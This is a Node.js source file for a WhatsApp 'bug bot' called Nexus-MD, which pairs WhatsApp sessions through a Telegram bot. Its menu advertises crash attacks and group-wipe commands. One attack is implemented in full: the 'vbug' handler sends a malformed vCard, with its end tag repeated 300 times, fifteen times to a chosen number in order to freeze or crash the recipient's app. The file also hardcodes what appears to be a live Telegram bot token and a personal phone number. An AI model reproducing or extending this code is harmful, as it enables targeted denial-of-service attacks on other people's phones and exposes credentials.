const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    DisconnectReason, 
    getContentType,
    fetchLatestBaileysVersion
} = require("@whiskeysockets/baileys");
const TelegramBot = require('node-telegram-bot-api');
const pino = require("pino");
const fs = require("fs");

// --- [ CONFIGURATION ] ---
const tgToken = '8628876949:AAGE8DNJIpOaaD3akR4MRaLfNjd3aN-tP_4';
const ownerNumber = "94770475809";
const prefix = ".";

const tgBot = new TelegramBot(tgToken, { polling: true });

async function startNexus() {
    const { state, saveCreds } = await useMultiFileAuthState('session');
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        auth: state,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        browser: ["Nexus-V5", "Chrome", "20.0.04"]
    });

    // --- [ TELEGRAM PAIRING LOGIC ] ---
    tgBot.onText(/\/pair (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        let targetNum = match[1].replace(/[^0-9]/g, '');
        if (!targetNum) return tgBot.sendMessage(chatId, "❌ නම්බර් එකත් එක්ක ගහපන් මචං. \nඋදා: `/pair 94770475809`", { parse_mode: "Markdown" });

        tgBot.sendMessage(chatId, `⏳ *${targetNum}* සඳහා Pairing Code එක සකසමින් පවතී...`);

        try {
            const { state: tState } = await useMultiFileAuthState(`temp_${targetNum}`);
            const tSock = makeWASocket({ auth: tState, logger: pino({ level: "silent" }), browser: ["Nexus-Generator", "Safari", "1.0"] });
            
            setTimeout(async () => {
                let code = await tSock.requestPairingCode(targetNum);
                await tgBot.sendMessage(chatId, `🔥 *YOUR CODE:* \`${code}\` \n\nමේක WhatsApp එකේ ගහපන්!`, { parse_mode: "Markdown" });
            }, 5000);
        } catch (e) { tgBot.sendMessage(chatId, "❌ වැරදීමක් වුණා!"); }
    });

    sock.ev.on('creds.update', saveCreds);

    // --- [ WHATSAPP MESSAGES & GRAND MENU ] ---
    sock.ev.on('messages.upsert', async (chat) => {
        const msg = chat.messages[0];
        if (!msg.message || msg.key.fromMe) return;
        const from = msg.key.remoteJid;
        const type = getContentType(msg.message);
        const body = (type === 'conversation') ? msg.message.conversation : (type === 'extendedTextMessage') ? msg.message.extendedTextMessage.text : '';
        
        if (!body.startsWith(prefix)) return;
        const command = body.slice(prefix.length).trim().split(' ')[0].toLowerCase();
        const args = body.trim().split(/ +/).slice(1);

        // --- ⚡ GRAND MENU ⚡ ---
        if (command === 'menu') {
            const grandMenu = `
⚡ *NEXUS-MD V5.0 ULTIMATE MENU* ⚡
 
👋 *Owner:* Sasiya MD
🛡️ *System:* Hybrid (WA + TG) Active
🚀 *Ping:* 24ms

*─── [ 🔗 PAIRING SYSTEM ] ───*
◈ ${prefix}pair - Manual Request
◈ Telegram: /pair [number]

*─── [ 💀 EXTREME BUG ATTACKS ] ───*
◈ ${prefix}vbug - Vcard Mega Crash ⚰️
◈ ${prefix}cbug - Char Overflow Bug
◈ ${prefix}lbug - Location Freeze
◈ ${prefix}abug - Audio Buffer Bug
◈ ${prefix}pbug - Poll Unlimited
◈ ${prefix}tagbug - Contact Tag Crash
◈ ${prefix}crash - System Total Freeze

*─── [ 👾 GROUP EXPLOITS ] ───*
◈ ${prefix}kickall - Group Wipe
◈ ${prefix}hidetag - Ghost Tag All
◈ ${prefix}promote - Admin Power

*─── [ 🛠️ TOOLS & OWNER ] ───*
◈ ${prefix}ping - Speed Test
◈ ${prefix}status - System Info
◈ ${prefix}reboot - Restart Bot

🚀 *Powered by Developer Nexus*
🛡️ *Nexus-MD: The King of Bugs*
            `;

            await sock.sendMessage(from, { 
                text: grandMenu,
                contextInfo: {
                    externalAdReply: {
                        title: "NEXUS BUG SYSTEM V5.0",
                        body: "World's Most Dangerous Bug Bot",
                        thumbnailUrl: "https://files.catbox.moe/6v0m3q.jpg",
                        mediaType: 1,
                        renderLargerThumbnail: true
                    }
                }
            });
        }

        // --- BUG LOGIC (VCARD) ---
        if (command === 'vbug') {
            let target = args[0] ? args[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : from;
            const vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:NEXUS CRASH ⚰️\n' + 'TEL;waid=94770475809:+94770475809\n' + 'END:VCARD'.repeat(300);
            await sock.sendMessage(from, { text: "💀 Vcard Crash Attack Started..." });
            for (let i = 0; i < 15; i++) {
                await sock.sendMessage(target, { contacts: { displayName: 'NEXUS CRASH', contacts: [{ vcard }] } });
                await new Promise(r => setTimeout(r, 800));
            }
            sock.sendMessage(from, { text: "✅ Done!" });
        }
        
        // උඹට ඕනම නම් මෙතනට තව Commands 100ක් උනත් ඇඩ් කරන්න පුළුවන්...
    });

    sock.ev.on('connection.update', (update) => {
        const { connection } = update;
        if (connection === 'open') console.log('✅ Nexus-MD V5.0 Online!');
        if (connection === 'close') startNexus();
    });
}

startNexus();
